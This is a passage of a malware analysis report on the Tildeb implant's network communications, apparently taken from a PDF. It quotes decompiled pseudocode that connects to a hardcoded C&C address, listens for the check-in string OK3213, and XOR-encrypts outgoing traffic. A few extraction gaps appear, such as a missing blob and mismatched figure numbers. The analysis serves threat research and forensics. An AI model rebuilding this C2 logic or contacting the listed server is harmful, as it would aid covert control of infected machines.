@@ -1,0 +1,125 @@
+Network Communications
+All of the network sockets created to communicate with the C&C server is carried over the TCP protocol.
+Tildeb may establish either an ingress or egress connection with the server depending on which
+connection is established successfully. It uses the MFC Classes CAsyncSocket and CSocket for all
+network communications.
+First, it creates a TCP SOCK_STREAM with the list of events “ FD_CLOSE | FD_CONNECT |
+FD_ACCEPT | FD_OOB | FD_WRITE | FD_READ ”. However, there's nothing in the code that checks for
+these events. Without checking whether the socket is successfully created or not, it attempts to connect
+to it using the hardcoded IP address 137[.]140[.]55[.]211 over the default port number 25. It’s worth noting
+that despite the port number assignment, the implant does not communicate over the Simple Mail
+Transfer Protocol (SMTP).
+If the connection is successful, it proceeds to set the priority class of the process to
+NORMAL_PRIORITY_CLASS (no scheduling requirements). It then attempts to disable the Nagle
+4
+algorithm for send coalescing using the option TCP_NODELAY for a non-created socket. Additionally,
+this same, non-existent socket is referenced three more times in the code (all designed to shut it down,
+making it likely that it's leftover code). It then sends the check-in message Success\x00 to the server then
+creates the cleanup_thread thread.
+If it fails to connect to the socket, it closes it and creates the cleanup_thread thread. It then creates
+another socket with similar attributes, but for accepting ingress connection over the default port 1608. The
+socket is created to listen on all network interfaces, expecting to receive the exact check-in message
+OK3213 from the server. If the message does not match, the implant bails out.
+Figure 3 shows how the abovementioned steps are carried out in the code. Worth noting is the use of
+different classes, CAsyncSocket and CSocket, and the function listen() from the library Ws2_32.dll . It is
+not clear why these APIs were mixed together to create a socket. Additionally, the return value of the API
+GetLastError() is never checked for.
+```
+       long lEvent = (FD_READ | FD_WRITE | FD_OOB | FD_ACCEPT | FD_CONNECT | FD_CLOSE);
+       CAsyncSocket::Create(&CSocket_success, 0, lEvent, 0);
+       if (!CAsyncSocket::Connect(&CSocket_success, ip_addr_ar, dst_port_tcp)) {
+    GetLastError();        // the return value is never checked!
+   CSocket::Close( & CSocket_success);
+   if (!CreateThread(0, 0, cleanup_thread, 0, 0, &ThreadId)) {
+
+   return -1;
+
+   }
+   CAsyncSocket::Create(&CSocket_listening, nSocketPort, SOCK_STREAM, lEvent, 0);
+   listen(s, 5);         // backlog = max of 5 outstanding connections
+   CSocket::Accept(&CSocket_listening, 0, 0);
+   Dest[0] = 0;
+   CSocket::Receive(&CSocket_listening, Dest, 1024, 0);
+   if (strcmp(Dest, aOk3213))              // " OK*3213* "
+   {
+
+   return -1;
+
+   }
+   }
+   h_process = GetCurrentProcess();
+   SetPriorityClass(h_process, NORMAL_PRIORITY_CLASS);
+
+   setsockopt(notcreated_socket, IPPROTO_TCP, TCP_NODELAY, &nd_disable, 4);
+   CSocket::Send(&CSocket_success, aSuccess, 8, 0);   // " Success\x00 "
+   if (!ThreadId && !CreateThread(0, 0, cleanup_thread, 0, 0, &ThreadId)) {
+
+    return -1;
+
+```
+Figure 3: Sockets creation - hex-rays decompiler pseudocode
+Once the socket is successfully created and the first plaintext packet is sent or received, Tildeb starts to
+set up a secure communication channel with the server such that all subsequent traffic is encrypted. To
+establish such a connection, it first expects to receive a buffer of 132 bytes, which we’ve referred to as
+R_A . Then, it creates a buffer of 132 bytes with pseudorandom data, which we’ve referred to as S_A . The
+first 128 bytes are the result of SHA-1 (modified version) hashing of different elements from the system
+such as cursor position, thread ID, thread times, process ID, memory status, system time, and
+performance counter among others. The 128 bytes are then compared against a hardcoded blob of 132
+bytes. If the last dword value is greater than the last dword value of the hardcoded blob, the buffer is
+regenerated. This comparison is done backward (from last to first) by comparing a dword value from each
+buffer at a time until the condition fails. We’ll refer to this comparison as cmp_dw_bckwrd . The last 4
+bytes (offsets: [0x88-0x83]) are always zero (this buffer of 132 bytes is first initialized to zero).
+5
+Hardcoded blob is:
+Note that all of the blobs of bytes are stored as strings in the code and in the reverse order of what’s
+shown. Before use, each of them is converted to hex and then the bytes’ order is reversed to look like the
+aforementioned blob.
+The S_A buffer is further modified, and similar comparisons are done on it (with the fixed blob 02 00 00
+00 00), and then sent to the server. The R_A buffer is then modified using the 128 pseudorandom bytes
+generated earlier for S_A and the blob 02 00 00 00 00.
+Later, the implant generates a seed key of 256 bytes (which we’ve referred to as Se_Ke ), considering the
+modified R_A buffer. It then receives a buffer of 132 bytes from the server, which we’ve referred to as
+R_B . This buffer will then be modified with the hardcoded blob 4B A0 00 00 00 00 00 00 using the
+hardcoded “random” blob of 132 bytes:
+Finally and for verification, it compares both the S_A and R_B buffers. Both have to match to send the
+status message Success\x00 (this is different from the check-in request described earlier). Otherwise, it
+sends the message Error\x00 to the server. In case the comparison fails, the implant bails out. These
+messages are sent XOR-encrypted with every key byte being unique. The generated key is dependent on
+the seed key Se_Ke . Subsequently, all further communications are XOR-encrypted.
+In a nutshell, this exchange of packets demonstrates the sharing of what looks like session keys that are
+client-server dependent. Each established TCP session with the server would generate a different set of
+encryption and decryption keys. Nevertheless, since only the XOR binary operator is used for encryption
+and decryption, having prior knowledge on the nature of the data being exfiltrated or received makes it
+possible to decrypt it.
+Figure 4 shows the code responsible for sending encrypted traffic. Every buffer to be sent is first allocated
+on the heap, encrypted, sent, and then freed from memory. From a forensics standpoint, and memory
+analysis in particular, this makes it hard to collect such evidentiary data. However, this is not the case
+when receiving data from the server. It is rather decrypted and consumed without any attempt to clear it
+from the memory or disk.
+6
+```
+            {
+            result = VirtualAlloc(0,dwSize,MEM_COMMIT,PAGE_READWRITE);
+            buffer = result;
+            if (result) {
+            qmemcpy(result, data, dwSize);
+            for (i = 0; i < dwSize; ++i) {
+            buffer[i] ^= get_key(Se_Ke);
+            }
+            bytes_sent = CSocket::Send(hSocket,buffer,dwSize,flag);
+            VirtualFree(buffer, 0, MEM_RELEASE);
+        result = bytes_sent;
+        }
+
+        return result;
+
+        }
+
+```
+Figure 4: send function - encrypted channel – hex-rays decompiler pseudocode
+After setting up a secure communication channel, Tildeb is ready to receive control commands to perform
+various malicious activities on the infected system. Figure 5 illustrates the process of establishing a
+successful connection with the remote server.
+7
+Figure 6: How Tildeb establishes a successful connection
+8
